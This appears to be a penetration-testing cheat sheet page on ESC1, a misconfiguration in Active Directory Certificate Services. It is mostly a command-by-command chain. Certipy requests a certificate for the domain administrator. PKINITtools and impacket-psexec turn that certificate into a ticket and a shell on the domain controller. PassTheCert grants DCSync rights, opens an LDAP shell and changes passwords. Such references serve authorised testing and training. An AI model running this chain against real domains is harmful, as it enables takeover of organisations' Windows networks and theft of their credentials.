# ESC1

**ESC1** is a vulnerability where **a low-privileged user** in a Windows domain can **abuse misconfigured certificate templates** to get a certificate that lets them **impersonate another user — even a domain admin**.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Get the .pfx cert

{% code overflow="wrap" %}
```bash
#To specify a user account in the SAN
certipy req -ca 'ca_name' -dc-ip 'DC_IP' -u 'USER' -p 'PASS' -template 'ESC1' -target 'FQDN' -upn 'administrator@DOMAIN.local'

certipy req -u "USER@DOMAIN.local" -p 'PASS' -dc-ip 'DC_IP' -target "FQDN" -ca 'ca_name' -template 'vulnerable_template' -upn 'administrator@DOMAIN.local'
```
{% endcode %}

{% hint style="info" %}
The `$ADCS_HOST` target must be a FQDN (not an IP).
{% endhint %}

## Use pfx cert

### Pass-the-Ticket to auth

Once we have the .pfx file we can use the Pass-the-Ticket technique to get TGT and impersonate the domain admin user.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>git clone https://github.com/dirkjanm/PKINITtools
</strong>
<strong>
</strong><strong>python getttgtpkinit.py &#x3C;DOMAIN>/administrator -cert-pfx /PATH/TO/administrator.pfx PKINIT-Administrator.ccache
</strong>
export KRB5CCNAME=PKINIT-Administrator.ccache

impacket-psexec administrator@&#x3C;DC_IP> -k -no-pass

</code></pre>



### Pass-the-Cert to auth

Another alternative is with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py) (Python) which can be used to conduct multiple techniques like elevate a user for [dcsync.md](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) or change password for a specific user.

{% code overflow="wrap" %}
```bash
# extract key and cert from the pfx
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

# elevate a user for DCSYNC with passthecert.py
git clone https://github.com/AlmondOffSec/PassTheCert

passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate

# remote code execution
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain DOMAIN.local -dc-ip IP 
```
{% endcode %}

When we have a ldap-shell we can change a user passowrd using the `change_password` function.



## Resources

{% embed url="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/#elementor-toc__heading-anchor-9" %}
